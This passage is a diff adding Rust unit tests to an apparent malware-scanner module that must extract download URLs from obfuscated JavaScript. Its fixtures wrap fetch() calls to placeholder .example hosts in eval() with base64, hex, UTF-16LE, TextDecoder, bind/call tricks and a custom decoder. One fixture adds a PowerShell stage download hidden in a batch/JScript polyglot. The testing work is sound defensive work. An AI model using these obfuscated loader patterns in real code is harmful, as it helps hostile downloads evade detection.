         let chars = "https://char-member-var-call-js.example/p"
@@ -12121,6 +29630,72 @@ mod js_url_extraction_tests {
             )
         });
         assert!(has, "JS atob payload URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_globalthis_atob_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://globalthis-atob-js.example/p')",
+        );
+        let js = format!(r#"eval(globalThis.atob("{encoded}"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://globalthis-atob-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS globalThis.atob payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_template_literal_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-template-js.example/p')",
+        );
+        let js = format!("eval(atob(`{encoded}`))").into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-template-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob template literal payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_optional_call_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-optional-call-js.example/p')",
+        );
+        let js = format!(r#"eval(atob?.("{encoded}"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-optional-call-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob optional-call payload URL missed: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -12321,6 +29896,28 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_atob_optional_chain_trimmed_string_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-optional-trim-js.example/p')",
+        );
+        let js = format!(r#"var b = "  {encoded}  "; eval(atob(b?.trim()))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-optional-trim-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob optional-chain trim payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_replace_all_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
@@ -12469,6 +30066,71 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_buffer_from_base64_urlsafe_alphabet_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = "ZmV0Y2goJ2h0dHBzOi8vYnVmZmVyLWJhc2U2NHVybC1qcy5leGFtcGxlL3A_eD0wJyk";
+        let js = format!(r#"eval(Buffer.from("{encoded}", "base64").toString())"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://buffer-base64url-js.example/p?x=0"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from base64 URL-safe alphabet payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_urlsafe_alphabet_payload_not_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = "ZmV0Y2goJ2h0dHBzOi8vYnVmZmVyLWJhc2U2NHVybC1qcy5leGFtcGxlL3A_eD0wJyk";
+        let js = format!(r#"eval(atob("{encoded}"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://buffer-base64url-js.example/p?x=0"
+            )
+        });
+        assert!(
+            !has,
+            "JS atob decoded URL-safe alphabet as standard base64: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_buffer_from_bind_base64_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://buffer-from-bind-base64-js.example/p')",
+        );
+        let js = format!(
+            r#"var b = "{encoded}"; eval(Buffer.from.bind(Buffer)(b, "base64").toString())"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://buffer-from-bind-base64-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from.bind base64 payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_new_buffer_base64_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
@@ -12590,6 +30252,31 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_buffer_from_hex_utf16le_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://buffer-from-hex-utf16le-js.example/p')";
+        let encoded = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .map(|byte| format!("{byte:02x}"))
+            .collect::<String>();
+        let js = format!(r#"var b = "{encoded}"; eval(Buffer.from(b, "hex").toString("utf16le"))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://buffer-from-hex-utf16le-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from hex UTF-16LE payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_buffer_from_byte_array_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let payload = "fetch('https://buffer-from-byte-array-js.example/p')";
@@ -12635,6 +30322,57 @@ mod js_url_extraction_tests {
         assert!(
             has,
             "JS Buffer.from bound byte array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_buffer_from_utf16le_byte_array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://buffer-from-utf16le-byte-array-js.example/p')";
+        let bytes = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .map(|byte| byte.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(Buffer.from([{bytes}]).toString("utf16le"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://buffer-from-utf16le-byte-array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from UTF-16LE byte array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_buffer_from_bound_utf16le_byte_array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://buffer-from-bound-utf16le-byte-array-js.example/p')";
+        let bytes = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .map(|byte| byte.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js =
+            format!(r#"var a = [{bytes}]; eval(Buffer.from(a).toString("utf16le"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://buffer-from-bound-utf16le-byte-array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from bound UTF-16LE byte array payload URL missed: {:?}",
             env.traits
         );
     }
@@ -12820,6 +30558,375 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_textdecoder_int8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-int8array-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js =
+            format!(r#"eval(new TextDecoder().decode(new Int8Array([{bytes}])))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-int8array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder Int8Array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_uint8clampedarray_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-uint8clampedarray-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(new TextDecoder().decode(new Uint8ClampedArray([{bytes}])))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-uint8clampedarray-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder Uint8ClampedArray payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_encoding_arg_uint8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-encoding-arg-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(new TextDecoder("utf-8").decode(new Uint8Array([{bytes}])))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-encoding-arg-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder encoding arg Uint8Array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_buffer_from_base64_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://textdecoder-buffer-base64-js.example/p')",
+        );
+        let js = format!(r#"eval(new TextDecoder().decode(Buffer.from("{encoded}", "base64")))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-buffer-base64-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder Buffer.from(base64) payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_instance_buffer_from_base64_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://textdecoder-instance-buffer-base64-js.example/p')",
+        );
+        let js = format!(
+            r#"var td = new TextDecoder(); eval(td.decode(Buffer.from("{encoded}", "base64")))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-instance-buffer-base64-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder instance Buffer.from(base64) payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_bound_decode_uint8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-decode-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(
+            r#"var td = new TextDecoder(); eval(td.decode.bind(td)(new Uint8Array([{bytes}])))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-decode-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound decode payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_bound_encoding_instance_buffer_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-encoding-instance-js.example/p')";
+        let bytes = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .collect::<Vec<_>>();
+        let encoded = bytes
+            .iter()
+            .map(|byte| format!("{byte:02x}"))
+            .collect::<String>();
+        let js = format!(
+            r#"var enc = "utf-16le"; var td = new TextDecoder(enc); eval(td.decode(Buffer.from("{encoded}", "hex")))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-encoding-instance-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound encoding instance payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_utf8_options_arg_uint8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-options-arg-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(
+            r#"eval(new TextDecoder("utf-8", {{ fatal: false }}).decode(new Uint8Array([{bytes}])))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-options-arg-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder UTF-8 options arg Uint8Array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_window_textdecoder_uint8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://window-textdecoder-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(new window.TextDecoder().decode(new Uint8Array([{bytes}])))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://window-textdecoder-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS window.TextDecoder Uint8Array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_window_bracket_textdecoder_uint8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://window-bracket-textdecoder-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(new window["TextDecoder"]().decode(new Uint8Array([{bytes}])))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://window-bracket-textdecoder-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS window[\"TextDecoder\"] Uint8Array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_non_utf8_encoding_arg_does_not_decode_ascii_bytes() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-non-utf8-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(new TextDecoder("utf-16le").decode(new Uint8Array([{bytes}])))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-non-utf8-js.example/p"
+            )
+        });
+        assert!(
+            !has,
+            "JS TextDecoder non-UTF-8 bytes were decoded as UTF-8: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_utf16le_uint8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-utf16le-js.example/p')";
+        let bytes = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .map(|byte| byte.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(new TextDecoder("utf-16le").decode(new Uint8Array([{bytes}])))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-utf16le-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder UTF-16LE Uint8Array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_utf16le_buffer_from_hex_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-utf16le-buffer-hex-js.example/p')";
+        let encoded = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .map(|byte| format!("{byte:02x}"))
+            .collect::<String>();
+        let js =
+            format!(r#"eval(new TextDecoder("utf-16le").decode(Buffer.from("{encoded}", "hex")))"#)
+                .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-utf16le-buffer-hex-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder UTF-16LE Buffer.from(hex) payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_bound_utf16le_buffer_from_hex_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-utf16le-buffer-hex-js.example/p')";
+        let encoded = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .map(|byte| format!("{byte:02x}"))
+            .collect::<String>();
+        let js = format!(
+            r#"var b = Buffer.from("{encoded}", "hex"); eval(new TextDecoder("utf-16le").decode(b))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-utf16le-buffer-hex-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound UTF-16LE Buffer.from(hex) payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_textdecoder_bound_uint8array_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let payload = "fetch('https://textdecoder-bound-uint8array-js.example/p')";
@@ -12841,6 +30948,195 @@ mod js_url_extraction_tests {
         assert!(
             has,
             "JS TextDecoder bound Uint8Array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_bound_utf16le_uint8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-utf16le-js.example/p')";
+        let bytes = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .map(|byte| byte.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(
+            r#"var a = new Uint8Array([{bytes}]); eval(new TextDecoder("utf-16le").decode(a))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-utf16le-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound UTF-16LE Uint8Array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_bound_int8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-int8array-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"var a = new Int8Array([{bytes}]); eval(new TextDecoder().decode(a))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-int8array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound Int8Array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_bound_int8array_of_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-int8array-of-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"var a = Int8Array.of({bytes}); eval(new TextDecoder().decode(a))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-int8array-of-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound Int8Array.of payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_bound_int8array_from_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-int8array-from-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"var a = Int8Array.from([{bytes}]); eval(new TextDecoder().decode(a))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-int8array-from-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound Int8Array.from payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_bound_uint8clampedarray_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-uint8clampedarray-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(
+            r#"var a = new Uint8ClampedArray([{bytes}]); eval(new TextDecoder().decode(a))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-uint8clampedarray-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound Uint8ClampedArray payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_bound_uint8clampedarray_of_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-uint8clampedarray-of-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js =
+            format!(r#"var a = Uint8ClampedArray.of({bytes}); eval(new TextDecoder().decode(a))"#)
+                .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-uint8clampedarray-of-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound Uint8ClampedArray.of payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_bound_uint8clampedarray_from_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-uint8clampedarray-from-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(
+            r#"var a = Uint8ClampedArray.from([{bytes}]); eval(new TextDecoder().decode(a))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-uint8clampedarray-from-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound Uint8ClampedArray.from payload URL missed: {:?}",
             env.traits
         );
     }
@@ -12919,6 +31215,50 @@ mod js_url_extraction_tests {
             )
         });
         assert!(has, "JS atob.call payload URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_atob_bind_invoke_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-bind-invoke-js.example/p')",
+        );
+        let js = format!(r#"eval(atob.bind(window)("{encoded}"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-bind-invoke-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob.bind invoke payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_window_atob_call_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://window-atob-call-js.example/p')",
+        );
+        let js = format!(r#"eval(window.atob.call(null, "{encoded}"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://window-atob-call-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS window.atob.call payload URL missed: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -13396,6 +31736,146 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_custom_base64_decoder_call_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://custom-b64-js.example/p')";
+        let encoded = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, payload);
+        let js = format!(
+            r#"
+            var p = decode("{encoded}");
+            eval(p);
+            function decode(s) {{
+                var e = {{}}, i, v = [], r = '', w = String.fromCharCode;
+                var n = [[65,91],[97,123],[48,58],[43,44],[47,48]];
+                for (z in n) {{ for (i = n[z][0]; i < n[z][1]; i++) {{ v.push(w(i)); }} }}
+                for (i = 0; i < 64; i++) {{ e[v[i]] = i; }}
+                for (i = 0; i < s.length; i += 72) {{
+                    var b = 0, c, x, l = 0, o = s.substring(i, i + 72);
+                    for (x = 0; x < o.length; x++) {{
+                        c = e[o.charAt(x)];
+                        b = (b << 6) + c;
+                        l += 6;
+                        while (l >= 8) {{ r += w((b >>> (l -= 8)) % 256); }}
+                    }}
+                }}
+                return r;
+            }}
+            "#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://custom-b64-js.example/p"
+            )
+        });
+        assert!(has, "JS custom base64 decoder URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_custom_base64_decoder_powershell_payload_is_scanned() {
+        let payload = r#"powershell $p='https','://custom-b64-ps-js.example','/stage'; $u=($p -join ''); iwr $u"#;
+        let encoded = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, payload);
+        let script = format!(
+            r#"
+            @echo off
+            cscript //nologo "%~f0?.wsf"
+            exit /b
+            <script language="JScript">
+            var p = decode("{encoded}");
+            eval(p);
+            function decode(s) {{
+                var e = {{}}, i, v = [], r = '', w = String.fromCharCode;
+                var n = [[65,91],[97,123],[48,58],[43,44],[47,48]];
+                for (z in n) {{ for (i = n[z][0]; i < n[z][1]; i++) {{ v.push(w(i)); }} }}
+                for (i = 0; i < 64; i++) {{ e[v[i]] = i; }}
+                for (i = 0; i < s.length; i += 72) {{
+                    var b = 0, c, x, l = 0, o = s.substring(i, i + 72);
